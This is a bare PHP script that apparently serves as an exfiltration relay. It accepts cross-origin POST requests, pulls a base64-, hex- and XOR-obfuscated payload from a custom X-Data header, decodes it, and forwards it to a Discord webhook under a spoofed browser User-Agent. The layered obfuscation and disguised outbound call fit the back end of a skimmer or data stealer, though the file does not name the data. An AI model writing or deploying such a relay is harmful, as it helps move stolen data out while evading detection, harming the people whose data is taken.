<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type, X-Data');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_SERVER['HTTP_X_DATA'];
    $decoded = base64_decode($data);
    
    $bytes = array_map('hexdec', str_split($decoded, 2));
    $deobfuscated = array_map(function($b) { return $b ^ 0x55; }, $bytes);
    $json = implode(array_map('chr', $deobfuscated));
    
    $ch = curl_init($_ENV['DISCORD_WEBHOOK']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept: text/html,application/json,*/*',
        'Accept-Language: en-US,en;q=0.9'
    ]);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    echo json_encode(['status' => 'success']);
}
?>
